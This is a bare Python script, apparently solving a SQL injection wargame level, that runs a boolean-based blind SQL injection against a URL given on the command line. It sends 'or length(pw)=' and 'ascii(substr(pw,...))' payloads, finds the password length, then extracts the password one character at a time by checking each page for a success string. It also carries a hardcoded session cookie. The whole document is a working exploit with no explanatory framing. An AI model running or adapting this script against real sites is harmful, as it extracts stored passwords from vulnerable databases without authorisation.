import requests, sys
signature = "Hello admin"
headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
cookies={"PHPSESSID":"8al87atua9fclucfgn1vvuosb5"}
url = sys.argv[1]#"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw="
print(url)
password=""
for pw_len in range(10):
    len_url = url+"%27+or+length(pw)={}+%23".format(pw_len)
    res = requests.get(len_url, headers=headers, cookies=cookies)
    html = res.text
    print("html.find : {}, len(pw) : {}, url : {}".format(html.find(signature),pw_len, len_url))
    if html.find(signature) > 5:
        print("길이:{}".format(len_url))
        for i in range(1, pw_len+1):
            print("진행중(2) : {}".format(i))
            for ascii_value in range(30,128):
                res_url = url+"'+or+ascii(substr(pw, {}, 1))={}%23".format(i,ascii_value)
                print(res_url)
                result = requests.get(res_url, headers=headers, cookies=cookies)
                if result.text.find(signature) > 5:
                    password+=chr(ascii_value)
                    break #끝
print("end : {}".format(password))
